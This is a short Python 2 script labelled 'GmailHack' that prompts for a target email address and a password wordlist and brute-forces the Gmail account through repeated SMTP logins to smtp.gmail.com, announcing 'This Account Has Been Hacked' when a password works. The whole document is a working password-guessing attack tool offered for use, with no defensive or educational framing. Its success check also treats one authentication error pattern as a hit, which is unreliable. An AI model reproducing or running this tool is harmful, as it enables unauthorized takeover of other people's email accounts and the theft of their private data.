#!/usr/bin/python
'''create by Hak9'''

import smtplib
from os import system

def main():
   print '==================================================='
   print '                 create by Hak9                    '
   print '==================================================='
   print '               ++++++++++++++++++++                '
   print '\n                                                 '
   print '                   GmailHack                       '
   print '                                 ()   V.1.2        '
   print '                                                   '
   
main()
print '[01] Start Attack'
print '[02] Exit'
option = input('==>')
if option == 1:
   file_path = raw_input('Path of Password File :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
